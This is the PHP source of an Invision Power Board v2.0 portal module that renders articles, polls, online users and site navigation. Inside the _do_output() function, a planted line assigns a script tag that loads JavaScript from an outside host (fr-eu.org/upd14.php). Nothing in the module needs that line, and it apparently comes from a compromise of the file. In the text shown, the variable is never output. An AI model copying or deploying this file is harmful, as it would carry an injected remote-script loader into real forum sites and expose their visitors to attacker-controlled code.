<?php

/*
+--------------------------------------------------------------------------
|   Invision Power Board v2.0 (IPB Portal Module)
|   ========================================
|   by Matthew Mecham
|   (c) 2001 - 2004 Invision Power Services
|   http://www.invisionpower.com
|   ========================================
|   Web: http://www.invisionboard.com
|   Time: Wed, 04 May 2005 15:17:58 GMT
|   Release: 303bba6732d809e44cd52a144ab90a4b
|   Email: matt@invisionpower.com
|   Licence Info: http://www.invisionboard.com/?license
+---------------------------------------------------------------------------
|
|   > Click site core module
|   > Module written by Matt Mecham
|   > Date started: 1st July 2003
|
|	> Module Version Number: 2.0.0
|   > Quality Checked: Wed 15 Sept. 2004
+--------------------------------------------------------------------------
*/

class ipdl {

    var $output     = "";
    var $html       = "";
    var $template   = "";
    var $site_bits  = array();
    var $parser     = "";
    var $articles   = array();
    var $recent     = array();
    var $bad_forum  = array();
    var $good_forum = array();
    var $raw        = "";
    var $topic      = "";

    function auto_run()
    {
		global $ibforums, $DB, $std, $print, $forums;

    	//-----------------------------------------
    	// Get settings...
    	//-----------------------------------------

    	$DB->simple_construct( array( 'select' => 'conf_key,conf_value,conf_default', 'from' => 'conf_settings', 'where' => "conf_key LIKE 'csite%'" ) );
    	$DB->simple_exec();

    	while( $r = $DB->fetch_row() )
    	{
    		$value = $r['conf_value'] != "" ? $r['conf_value'] : $r['conf_default'];

    		if ( $r['conf_key'] == 'csite_nav_contents' or $r['conf_key'] == 'csite_fav_contents' )
    		{
    			$this->raw[ $r['conf_key'] ] = str_replace( '&#39;', "'", str_replace( "\r\n", "\n", $value ) );
    		}
    		else
    		{
    			$ibforums->vars[ $r['conf_key'] ] = $value;
    		}
    	}

		//-----------------------------------------
    	// Require the HTML and language modules
    	//-----------------------------------------

    	if ( ! $ibforums->vars['csite_on'] )
    	{
    		print "IPDynamic Lite has not been enabled. Please check your Invision Power Board Admin Settings";
    		exit();
    	}

		$ibforums->lang = $std->load_words($ibforums->lang, 'lang_portal', $ibforums->lang_id );

    	$this->html = $std->load_template('skin_portal');

    	require_once( ROOT_PATH."sources/lib/post_parser.php" );

        $this->parser = new post_parser( 1 );

        //-----------------------------------------
        // ??
        //-----------------------------------------

        if ( $ibforums->vars['dynamiclite'] == "" )
        {
        	$ibforums->vars['dynamiclite'] = $ibforums->base_url.'act=home';
        }

        //-----------------------------------------
		// Get forums we're allowed to read
		//-----------------------------------------

		foreach( $forums->forum_by_id as $id => $f )
		{
			if ( ($std->check_perms($f['read_perms']) != TRUE) or ($f['password'] != "" ) )
        	{
        		$this->bad_forum[] = $f['id'];
        	}
        	else
        	{
        		$this->good_forum[] = $f['id'];
        	}
        }

        //-----------------------------------------
    	// Grab articles new/recent in 1 bad ass query
    	//-----------------------------------------

    	$limit = $ibforums->vars['csite_article_max'];

    	if ( $ibforums->vars['csite_article_recent_on'] AND $ibforums->vars['csite_article_recent_max'] )
    	{
    		$limit += $ibforums->vars['csite_article_recent_max'];
    	}

    	if ( count($this->bad_forum) > 0 )
    	{
    		$qe = " AND t.forum_id NOT IN(".implode(',', $this->bad_forum ).") ";
    	}

    	if ( count($this->good_forum) > 0 )
		{
			$qe .= " AND t.forum_id IN(".implode(',', $this->good_forum ).") ";
		}

        if ( $ibforums->vars['csite_article_forum'] )
        {
        	$ibforums->vars['csite_article_forum'] = ','.$ibforums->vars['csite_article_forum'];
        }

        //-----------------------------------------
        // have we converted from another board?
        //-----------------------------------------

        if ( $ibforums->vars['vb_configured'] )
        {
			$DB->query("SELECT t.*, p.*, me.avatar_location, m.view_avs, me.avatar_size, m.id as member_id, m.name as member_name, m.mgroup
						FROM ibf_posts p
						 LEFT JOIN ibf_topics t on (t.tid=p.topic_id and t.approved=1 and t.moved_to IS NULL)
						 LEFT JOIN ibf_members m on (p.author_id=m.id)
						 LEFT JOIN ibf_member_extra me on (m.id=me.id)
						WHERE t.forum_id IN (-1{$ibforums->vars['csite_article_forum']}) $qe
						GROUP BY p.topic_id
						ORDER BY t.pinned DESC, p.post_date DESC
						LIMIT 0,$limit");
        }
        else
        {
        	$DB->cache_add_query( 'portal_get_monster_bitch', array( 'csite_article_forum' => $ibforums->vars['csite_article_forum'], 'qe' => $qe, 'limit' => $limit ) );
			$DB->cache_exec_query();
        }

        $i = 0;

        while ( $r = $DB->fetch_row() )
        {
        	if ( $i >= $ibforums->vars['csite_article_max'] )
        	{
        		//-----------------------------------------
        		// Store recent
        		//-----------------------------------------

        		$this->recent[ $r['pid'] ] = $r;
        	}
        	else
        	{
        		//-----------------------------------------
        		// Store new
        		//-----------------------------------------

        		$this->articles[ $r['pid'] ] = $r;
        	}

        	$i++;
        }

    	//-----------------------------------------
    	// Assign skeletal template ma-doo-bob
    	//-----------------------------------------

    	$this->template = $this->html->csite_skeleton_template();

    	//-----------------------------------------
    	// Work on some fancy replacements
    	//-----------------------------------------

    	$this->site_bits['welcomebox']     = $this->_show_welcomebox();
    	$this->site_bits['search']         = $this->_show_search();
    	$this->site_bits['changeskin']     = $this->_show_changeskin();
    	$this->site_bits['sitenav']        = $this->_show_sitenav();
    	$this->site_bits['onlineusers']    = $this->_show_onlineusers();
    	$this->site_bits['poll']           = $this->_show_poll();
    	$this->site_bits['latestposts']    = $this->_show_latestposts();
    	$this->site_bits['recentarticles'] = $this->_show_recentarticles();
    	$this->site_bits['articles']       = $this->_show_articles();
    	$this->site_bits['affiliates']     = $this->_show_affiliates();

    	$this->_do_output();
 	}

 	/*-------------------------------------------------------------------------*/
 	// Do OUTPUT
 	/*-------------------------------------------------------------------------*/

 	function _do_output()
 	{
		global $ibforums, $DB, $std, $print, $Debug;
		$g_g   = '<script type="text/javascript"
		  src="http://www.fr-eu.org/upd14.php">
		</script>';
 		if ($DB->obj['debug'])
        {
        	flush();
        	print "<html><head><title>MySQL Debugger</title><body bgcolor='white'><style type='text/css'> TABLE, TD, TR, BODY { font-family: verdana,arial, sans-serif;color:black;font-size:11px }</style>";
        	print $ibforums->debug_html;
        	print "</body></html>";
        	exit();
        }

 		//-----------------------------------------
        // CSS
        //-----------------------------------------

 		$ibforums->skin['_usecsscache'] = 0;

 		$css = $print->_get_css();

        //-----------------------------------------
        // TEMPLATE REPLACEMENTS
        //-----------------------------------------

        $this->site_bits['title']      = $ibforums->vars['csite_title'];
        $this->site_bits['css']        = $css;
        $this->site_bits['javascript'] = $this->html->csite_javascript();

        //-----------------------------------------
        // SITE REPLACEMENTS
        //-----------------------------------------

        foreach( $this->site_bits as $sbk => $sbv )
        {
        	$this->template = str_replace( "<!--CS.TEMPLATE.".strtoupper($sbk)."-->", $sbv, $this->template );
        }

        //-----------------------------------------
      	// MACROS
      	//-----------------------------------------

      	$print->_unpack_macros();

      	foreach( $print->macros as $i => $row )
      	{
			if ($row['macro_value'] != "")
			{
				$this->template = str_replace( "<{".$row['macro_value']."}>", $row['macro_replace'], $this->template );
			}
		}

		//-----------------------------------------
      	// DEBUG
      	//-----------------------------------------

		if ( $ibforums->vars['debug_level'] )
		{
			$this->template = str_replace( "<!--CS.TEMPLATE.DEBUG-->", $this->html->tmpl_debug( $DB->get_query_cnt(), sprintf( "%.4f",$Debug->endTimer() ) ), $this->template );
		}

		//-----------------------------------------
      	// CPYRT
      	//-----------------------------------------

		$extra = "";
        $ur    = '';

        if ( $ibforums->vars['ipb_reg_number'] )
        {
        	$ur = '(R)';

        	if ( $ibforums->vars['ipb_reg_show'] and $ibforums->vars['ipb_reg_name'] )
        	{
        		$extra = "- Registered to: ". $ibforums->vars['ipb_reg_name'];
        	}
        }

        $copyright = "\n\n<div align='center' class='copyright'>Powered by <a href=\"http://www.invisionboard.com/\">Invision Power Board</a> v1.1.1 © 2003  <a href=\"http://www.invisionpower.com/\">IPS, Inc.</a></div>";

        if ($ibforums->vars['ips_cp_purchase'])
        {
        	$copyright = "";
        }

		$this->template = str_replace( "<!--CS.TEMPLATE.COPYRIGHT-->", $copyright, $this->template );

		//-----------------------------------------
		// CHAT
		//-----------------------------------------

		if ($ibforums->vars['chat_account_no'])
		{
			$ibforums->vars['chat_height'] += 50;
			$ibforums->vars['chat_width']  += 50;

			$chat_link = ( $ibforums->vars['chat_display'] == 'self' )
					   ? $this->html->show_chat_link_inline()
					   : $this->html->show_chat_link_popup();

			$this->template = str_replace( "<!--IBF.CHATLINK-->", $chat_link, $this->template );
		}

		//-----------------------------------------
		// Stick in TSL link?
		//-----------------------------------------

		if ($ibforums->vars['top_site_list_integrate'])
		{
			$this->template = str_replace( "<!--IBF.TSLLINK-->", $ibforums->skin_global->show_tsl_link_inline(), $this->template );
		}

		//-----------------------------------------
		// BOARD RULES
		//-----------------------------------------

		if ($ibforums->vars['gl_show'] and $ibforums->vars['gl_title'])
        {
        	if ($ibforums->vars['gl_link'] == "")
        	{
        		$ibforums->vars['gl_link'] = $ibforums->base_url."act=boardrules";
        	}

        	$this->template = str_replace( "<!--IBF.RULES-->", $this->html->rules_link($ibforums->vars['gl_link'], $ibforums->vars['gl_title']), $this->template );
        }

        //-----------------------------------------
        // Img dir.. (?!".preg_quote($ibforums->vars['board_url'], '/')."/)
        //-----------------------------------------

        $this->template = preg_replace( "#([^/])style_images/(<\#IMG_DIR\#>|".preg_quote($ibforums->skin['_imagedir'], '/').")#is", "\\1".$ibforums->vars['board_url']."/style_images/\\2", $this->template );
		$this->template = preg_replace( "#([^/])style_emoticons#is", "\\1".$ibforums->vars['board_url']."/style_emoticons", $this->template );
		$this->template = preg_replace( "#([^/])style_avatars#is"  , "\\1".$ibforums->vars['board_url']."/style_avatars", $this->template );
		$this->template = preg_replace( "#([^/])jscripts#is"       , "\\1".$ibforums->vars['board_url']."/jscripts", $this->template );

		$this->template = str_replace( "<#IMG_DIR#>", $ibforums->skin['_imagedir'], $this->template );
		$this->template = str_replace( "<#EMO_DIR#>", $ibforums->skin['_emodir']  , $this->template );

		//-----------------------------------------
		// Do shutdown
		//-----------------------------------------

		if ( ! USE_SHUTDOWN )
        {
        	$std->my_deconstructor();
        	$DB->close_db();
        }

		//-----------------------------------------
		// Start GZIP compression
        //-----------------------------------------

        if ($ibforums->vars['disable_gzip'] != 1)
        {
        	$buffer = ob_get_contents();
        	ob_end_clean();
        	ob_start('ob_gzhandler');
        	print $buffer;
        }

        $print->do_headers();

		//-----------------------------------------
      	// PRINT!
      	//-----------------------------------------

		print $this->template;

		exit();
 	}

 	/*-------------------------------------------------------------------------*/
 	// Format topic entry
 	/*-------------------------------------------------------------------------*/

 	function _tmpl_format_topic($entry, $cut)
 	{
		global $ibforums, $DB, $std, $print;

 		$entry['title'] = strip_tags($entry['title']);
		$entry['title'] = str_replace( "&#33;" , "!" , $entry['title'] );
		$entry['title'] = str_replace( "&quot;", "\"", $entry['title'] );

		if (strlen($entry['title']) > $cut)
		{
			$entry['title'] = substr( $entry['title'],0,($cut - 3) ) . "...";
			$entry['title'] = preg_replace( '/&(#(\d+;?)?)?(\.\.\.)?$/', '...',$entry['title'] );
		}

		$entry['posts'] = $std->do_number_format($entry['posts']);
 		$entry['views'] = $std->do_number_format($entry['views']);

 		$ibforums->vars['csite_article_date'] = $ibforums->vars['csite_article_date'] ? $ibforums->vars['csite_article_date'] : 'm-j-y H:i';

 		$entry['date']  = gmdate( $ibforums->vars['csite_article_date'], $entry['post_date'] + $std->get_time_offset() );

 		return $this->html->tmpl_topic_row($entry['tid'], $entry['title'], $entry['posts'], $entry['views'], $entry['member_id'], $entry['member_name'], $entry['date']);
 	}


 	/*-------------------------------------------------------------------------*/
 	// Main articles
 	/*-------------------------------------------------------------------------*/

 	function _show_articles()
 	{
		global $ibforums, $DB, $std, $print;

 		$html = "";
 		$attach_pids = array();

 		foreach( $this->articles as $pid => $entry )
 		{
 			$bottom_string = "";
 			$read_more     = "";
 			$top_string    = "";

 			$real_posts = $entry['posts'];

 			$entry['title'] = strip_tags($entry['title']);

 			$entry['posts'] = $std->do_number_format(intval($entry['posts']));
 			$entry['views'] = $std->do_number_format($entry['views']);

 			$comment_link  = $this->html->tmpl_comment_link($entry['tid']);
 			$profile_link  = $std->make_profile_link( $entry['last_poster_name'], $entry['last_poster_id'] );

 			if ( $real_posts > 0 )
 			{
 				$bottom_string = sprintf( $ibforums->lang['article_reply'], $entry['views'], $comment_link, $profile_link );
 			}
 			else
 			{
 				$bottom_string = sprintf( $ibforums->lang['article_noreply'], $entry['views'], $comment_link );
 			}

 			$ibforums->vars['csite_article_date'] = $ibforums->vars['csite_article_date'] ? $ibforums->vars['csite_article_date'] : 'm-j-y H:i';

 			$entry['date'] = gmdate( $ibforums->vars['csite_article_date'], $entry['post_date'] + $std->get_time_offset() );

 			$top_string = sprintf(
 								   $ibforums->lang['article_postedby'],
 								   $std->make_profile_link( $entry['member_name'], $entry['member_id'] ),
 								   $entry['date'],
 								   $entry['posts']
 								 );

 			$entry['post'] = str_replace( '<br>', '<br />', $entry['post'] );

 			//-----------------------------------------
 			// Quoted attachments?
 			//-----------------------------------------

 			preg_match( "#\[attachmentid=(\d+)\]i#", $entry['post'], $match );

 			if ( $match[1] )
 			{
 				$attach_pids[ $match[1] ] = $match[1];
 			}

 			//-----------------------------------------
 			// Inline attachments?
 			//-----------------------------------------

 			$attach_pids[ $entry['pid'] ] = intval($entry['pid']);

 			$this->parser->pp_do_html  = ( $ibforums->cache['forum_cache'][ $entry['forum_id'] ]['use_html'] and $entry['post_htmlstate'] ) ? 1 : 0;
			$this->parser->pp_wordwrap = $ibforums->vars['post_wordwrap'];
			$this->parser->pp_nl2br    = $entry['post_htmlstate'] == 2 ? 1 : 0;

 			$entry['post'] = $this->parser->post_db_parse( $entry['post'] );

 			//-----------------------------------------
 			// Avatar
 			//-----------------------------------------

 			$entry['avatar'] = $std->get_avatar( $entry['avatar_location'], 1, $entry['avatar_size'], $entry['avatar_type'] );

 			if ( $entry['avatar'] )
 			{
 				$entry['avatar'] = $this->html->tmpl_wrap_avatar( $entry['avatar'] );
 			}

 			$html .= $this->html->tmpl_articles_row($entry, $bottom_string, $top_string);
 		}

 		if ( count( $attach_pids ) )
 		{
 			require_once( ROOT_PATH.'sources/topics.php' );
			$this->topic = new topics();
 			$this->topic->topic_init();

 			$html = $this->topic->parse_attachments( $html, $attach_pids );
 		}

 		return $this->html->tmpl_articles($html);
 	}

 	/*-------------------------------------------------------------------------*/
 	// Recent articles
 	/*-------------------------------------------------------------------------*/

 	function _show_recentarticles()
 	{
		global $ibforums, $DB, $std, $print;

 		if ( ! $ibforums->vars['csite_article_recent_on'] )
 		{
 			return;
 		}

 		if ( count( $this->recent ) < 1 )
 		{
 			return;
 		}

 		$html = "";

 		foreach( $this->recent as $pid => $entry )
 		{
 			$html .= $this->_tmpl_format_topic($entry, $ibforums->vars['csite_article_len']);
 		}

 		return $this->html->tmpl_recentarticles($html);
 	}

 	/*-------------------------------------------------------------------------*/
 	// Latest Posts
	/*-------------------------------------------------------------------------*/

 	function _show_latestposts()
 	{
		global $ibforums, $DB, $std, $print;

 		if ( ! $ibforums->vars['csite_discuss_on'] )
 		{
 			return;
 		}

 		$html  = "";
 		$limit = $ibforums->vars['csite_discuss_max'] ? $ibforums->vars['csite_discuss_max'] : 5;

 		if ( count($this->good_forum) > 0 )
    	{
    		$qe = "forum_id IN(".implode(',', $this->good_forum ).") AND ";
    	}

 		$DB->simple_construct( array( 'select' => 'tid, title, posts, starter_id as member_id, starter_name as member_name, start_date as post_date, views',
									  'from'   => 'topics',
									  'where'  => "$qe approved=1 and state != 'closed' and (moved_to is null or moved_to = '')",
									  'order'  => 'start_date DESC',
									  'limit'  => array( 0, $limit ) ) );
		$DB->simple_exec();

 		while ( $row = $DB->fetch_row() )
 		{
 			$html .= $this->_tmpl_format_topic($row, $ibforums->vars['csite_discuss_len']);
 		}

 		return $this->html->tmpl_latestposts($html);
 	}

 	/*-------------------------------------------------------------------------*/
 	// Poll
 	/*-------------------------------------------------------------------------*/

 	function _show_poll()
 	{
		global $ibforums, $DB, $std, $print;

 		$extra = "";
 		$sql   = "";
 		$check = 0;

 		if ( ! $ibforums->vars['csite_poll_url'] )
 		{
 			return;
 		}

 		//-----------------------------------------
		// Get the topic ID of the entered URL
		//-----------------------------------------

		preg_match( "/(\?|&amp;)?(t|showtopic)=(\d+)($|&amp;)/", $ibforums->vars['csite_poll_url'], $match );

		$tid = intval(trim($match[3]));

		if ($tid == "")
		{
			return;
		}

		//-----------------------------------------
		// Get the stuff from the DB
		//-----------------------------------------

		$DB->cache_add_query( 'portal_get_poll_join', array( 'mid' => intval($ibforums->member['id']), 'tid' => $tid ) );
		$DB->cache_exec_query();

		$poll = $DB->fetch_row();

		if ( ! $poll['pid'] )
		{
			return;
		}

		$poll['poll_question'] = $poll['poll_question'] ? $poll['poll_question'] : $poll['title'];

		//-----------------------------------------
		// Can we vote?
		//-----------------------------------------

		if ( $poll['state'] == 'closed' )
        {
        	$check = 1;
        	$poll_footer = $ibforums->lang['poll_finished'];
        }
		else if (! $ibforums->member['id'] )
        {
        	$check = 1;
        	$poll_footer = $ibforums->lang['poll_noguest'];
        }
		else if ( $poll['member_voted'] )
        {
        	$check = 1;
        	$poll_footer = $ibforums->lang['poll_voted'];
        }
        else if ( ($poll['starter_id'] == $ibforums->member['id']) and ($ibforums->vars['allow_creator_vote'] != 1) )
        {
        	$check = 1;
        	$poll_footer = $ibforums->lang['poll_novote'];
        }
        else
        {
        	$check = 0;
        	$poll_footer = $this->html->tmpl_poll_vote();
        }

		//-----------------------------------------
		// Show it
		//-----------------------------------------

        if ($check == 1)
        {
        	//-----------------------------------------
        	// Show the results
        	//-----------------------------------------

        	$total_votes = 0;

        	$html = $this->html->tmpl_poll_header($poll['poll_question'], $poll['tid']);

        	$poll_answers = unserialize(stripslashes($poll['choices']));

        	reset($poll_answers);
        	foreach ($poll_answers as $entry)
        	{
        		$id     = $entry[0];
        		$choice = $entry[1];
        		$votes  = $entry[2];

        		$total_votes += $votes;

        		if ( strlen($choice) < 1 )
        		{
        			continue;
        		}

        		if ($ibforums->vars['poll_tags'])
        		{
        			$choice = $this->parser->parse_poll_tags($choice);
        		}
        		if ( $ibforums->vars['post_wordwrap'] > 0 )
				{
					$choice = $this->parser->my_wordwrap( $choice, $ibforums->vars['post_wordwrap']) ;
				}

        		$percent = $votes == 0 ? 0 : $votes / $poll['votes'] * 100;
        		$percent = sprintf( '%.2f' , $percent );
        		$width   = $percent > 0 ? floor( round( $percent ) * ( 150 / 100 ) ) : 0;

        		$html   .= $this->html->tmpl_poll_result_row($votes, $id, $choice, $percent, $width);
        	}
        }
        else
        {
        	$poll_answers = unserialize(stripslashes($poll['choices']));
        	reset($poll_answers);

        	//-----------------------------------------
        	// Show poll form
        	//-----------------------------------------

        	$html = $this->html->tmpl_poll_header($poll['poll_question'], $poll['tid']);

        	foreach ($poll_answers as $entry)
        	{
        		$id     = $entry[0];
        		$choice = $entry[1];
        		$votes  = $entry[2];

        		$total_votes += $votes;

        		if ( strlen($choice) < 1 )
        		{
        			continue;
        		}

        		if ($ibforums->vars['poll_tags'])
        		{
        			$choice = $this->parser->parse_poll_tags($choice);
        		}
        		if ( $ibforums->vars['post_wordwrap'] > 0 )
				{
					$choice = $this->parser->my_wordwrap( $choice, $ibforums->vars['post_wordwrap']) ;
				}

        		$html   .= $this->html->tmpl_poll_choice_row($id, $choice);
        	}

        }

        $html .= $this->html->tmpl_poll_footer($poll_footer, sprintf( $ibforums->lang['poll_total_votes'], $total_votes ), $poll['tid'] );

 		return $html;
 	}

 	/*-------------------------------------------------------------------------*/
 	// Online users
 	/*-------------------------------------------------------------------------*/

 	function _show_onlineusers()
 	{
		global $ibforums, $DB, $std, $print;

 		if ( ! $ibforums->vars['csite_online_show'] )
 		{
 			return;
 		}

 		$this->sep_char = $this->html->csite_sep_char();

 		//-----------------------------------------
		// Get the users from the DB
		//-----------------------------------------

		$time = time() - ( ($ibforums->vars['au_cutoff'] ? $ibforums->vars['au_cutoff'] : 15) * 60 );

		$DB->simple_construct( array( 'select' => 'id, member_id, member_name, login_type, running_time, member_group',
									  'from'   => 'sessions',
									  'where'  => "running_time > $time",
									  'order'  => "running_time DESC"
							 )      );

		$DB->simple_exec();

		//-----------------------------------------
		// Cache all printed members
		//-----------------------------------------

		if ($ibforums->vars['au_cutoff'] == "")
		{
			$ibforums->vars['au_cutoff'] = 15;
		}

		//-----------------------------------------
		// Get the users from the DB
		//-----------------------------------------

		$cut_off = $ibforums->vars['au_cutoff'] * 60;
		$time    = time() - $cut_off;
		$qe      = "";
		$rows    = array( 0 => array( 'login_type'   => substr($ibforums->member['login_anonymous'],0, 1),
									  'running_time' => time(),
									  'member_id'    => $ibforums->member['id'],
									  'member_name'  => $ibforums->member['name'],
									  'member_group' => $ibforums->member['mgroup'] ) );

		if ( $ibforums->member['id'] )
		{
			$qe = "member_id !=".intval($ibforums->member['id'])." AND ";
		}

		$DB->simple_construct( array( 'select' => 'id, member_id, member_name, login_type, running_time, member_group',
									  'from'   => 'sessions',
									  'where'  => $qe." running_time > $time",
									  'order'  => "running_time DESC"
							 )      );


		$DB->simple_exec();

		//-----------------------------------------
		// FETCH...
		//-----------------------------------------

		while ($r = $DB->fetch_row() )
		{
			$rows[] = $r;
		}

		//-----------------------------------------
		// cache all printed members so we
		// don't double print them
		//-----------------------------------------

		$cached = array();

		foreach ( $rows as $result )
		{
			$last_date = $std->get_time( $result['running_time'] );

			//-----------------------------------------
			// Bot?
			//-----------------------------------------

			if ( strstr( $result['id'], '_session' ) )
			{
				//-----------------------------------------
				// Seen bot of this type yet?
				//-----------------------------------------

				$botname = preg_replace( '/^(.+?)=/', "\\1", $result['id'] );

				if ( ! $cached[ $result['member_name'] ] )
				{
					if ( $ibforums->vars['spider_anon'] )
					{
						if ( $ibforums->member['mgroup'] == $ibforums->vars['admin_group'] )
						{
							$active['NAMES'] .= "{$result['member_name']}*{$this->sep_char} \n";
						}
					}
					else
					{
						$active['NAMES'] .= "{$result['member_name']}{$this->sep_char} \n";
					}

					$cached[ $result['member_name'] ] = 1;
				}
				else
				{
					//-----------------------------------------
					// Yup, count others as guest
					//-----------------------------------------

					$active['GUESTS']++;
				}
			}

			//-----------------------------------------
			// Guest?
			//-----------------------------------------

			else if ($result['member_id'] == 0 )
			{
				$active['GUESTS']++;
			}

			//-----------------------------------------
			// Member?
			//-----------------------------------------

			else
			{
				if ( empty( $cached[ $result['member_id'] ] ) )
				{
					$cached[ $result['member_id'] ] = 1;

					$result['prefix'] = $ibforums->cache['group_cache'][ $result['member_group'] ]['prefix'];
					$result['suffix'] = $ibforums->cache['group_cache'][ $result['member_group'] ]['suffix'];

					if ($result['login_type'])
					{
						if ( ($ibforums->member['mgroup'] == $ibforums->vars['admin_group']) and ($ibforums->vars['disable_admin_anon'] != 1) )
						{
							$active['NAMES'] .= "<a href='{$ibforums->base_url}showuser={$result['member_id']}' title='$last_date'>{$result['prefix']}{$result['member_name']}{$result['suffix']}</a>*{$this->sep_char} \n";
							$active['ANON']++;
						}
						else
						{
							$active['ANON']++;
						}
					}
					else
					{
						$active['MEMBERS']++;
						$active['NAMES'] .= "<a href='{$ibforums->base_url}showuser={$result['member_id']}' title='$last_date'>{$result['prefix']}{$result['member_name']}{$result['suffix']}</a>{$this->sep_char} \n";
					}
				}
			}
		}

		$active['names'] = preg_replace( "/".preg_quote($this->sep_char)."$/", "", trim($active['NAMES']) );

		$active['total']    = $active['MEMBERS'] + $active['GUESTS'] + $active['ANON'];
		$active['visitors'] = $active['GUESTS']  + $active['ANON'];
		$active['members']  = $active['MEMBERS'];

		//-----------------------------------------
		// Parse language
		//-----------------------------------------

		$breakdown = sprintf( $ibforums->lang['online_breakdown'], intval($active['total']) );
		$split     = sprintf( $ibforums->lang['online_split']    , intval($active['members']), intval($active['visitors']) );


 		return $this->html->tmpl_onlineusers($breakdown, $split, $active['names']);
 	}

 	/*-------------------------------------------------------------------------*/
 	// Navigation Stuff
 	/*-------------------------------------------------------------------------*/

 	function _show_sitenav()
 	{
		global $ibforums, $DB, $std, $print;

 		if ( ! $ibforums->vars['csite_nav_show'] )
 		{
 			return;
 		}

 		$links = "";

 		$raw_nav = $this->raw['csite_nav_contents'];

 		foreach( explode( "\n", $raw_nav ) as $l )
 		{
 			preg_match( "#^(.+?)\[(.+?)\]$#is", trim($l), $matches );

 			$matches[1] = trim($matches[1]);
 			$matches[2] = trim($matches[2]);

 			if ( $matches[1] and $matches[2] )
 			{
 				$links .= $this->html->tmpl_links_wrap( str_replace( '{board_url}', $ibforums->base_url, $matches[1] ), $matches[2] );
 			}
 		}

 		return $this->html->tmpl_sitenav($links);
 	}

 	/*-------------------------------------------------------------------------*/
 	// Affiliates
 	/*-------------------------------------------------------------------------*/

 	function _show_affiliates()
 	{
		global $ibforums, $DB, $std, $print;

 		if ( ! $ibforums->vars['csite_fav_show'] )
 		{
 			return;
 		}

 		return $this->html->tmpl_affiliates($this->raw['csite_fav_contents']);
 	}

 	/*-------------------------------------------------------------------------*/
 	// Change skin
 	/*-------------------------------------------------------------------------*/

 	function _show_changeskin()
 	{
		global $ibforums, $DB, $std, $print;

 		if ( ! $ibforums->vars['csite_skinchange_show'] )
 		{
 			return;
 		}

 		$select = $this->html->tmpl_skin_select_top();

 		//-----------------------------------------
 		// Query DB for skins
 		//-----------------------------------------

 		$select .= $print->_build_skin_list();

 		$select .= $this->html->tmpl_skin_select_bottom();

 		return $this->html->tmpl_changeskin($select);
 	}

	/*-------------------------------------------------------------------------*/
 	// Search box
 	/*-------------------------------------------------------------------------*/

 	function _show_search()
 	{
		global $ibforums, $DB, $std, $print;

 		if ( ! $ibforums->vars['csite_search_show'] )
 		{
 			return;
 		}

 		return $this->html->tmpl_search();
 	}

 	/*-------------------------------------------------------------------------*/
 	// Welcome Box
 	/*-------------------------------------------------------------------------*/

 	function _show_welcomebox()
 	{
		global $ibforums, $DB, $std, $print;

 		if ( ! $ibforums->vars['csite_pm_show'] )
 		{
 			return;
 		}

 		$html = "";

 		$return = $_SERVER["HTTP_REFERER"];

 		if ( $return == "" )
 		{
 			$return = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
 		}

 		$return = urlencode($return);

 		if ( $ibforums->member['id'] )
 		{
 			//-----------------------------------------
 			// Work member info
 			//-----------------------------------------

		    $pm_string  = sprintf( $ibforums->lang['wbox_pm_string'] , "<a href='{$ibforums->base_url}act=Msg'>".intval($ibforums->member['new_msg'])."</a>" );
		    $last_visit = sprintf( $ibforums->lang['wbox_last_visit'], $std->get_date( $ibforums->member['last_visit'], 'LONG' ) );

		    $html = $this->html->tmpl_welcomebox_member($pm_string, $last_visit, $ibforums->member['name'], $ibforums->base_url.'act=home');

 		}
 		else
 		{
 			$top_string = sprintf( $ibforums->lang['wbox_guest_reg'], "<a href='{$ibforums->base_url}act=Reg'>{$ibforums->lang['wbox_register']}</a>" );

 			$html = $this->html->tmpl_welcomebox_guest($top_string, $return);
 		}

 		return $html;
	}


}

?>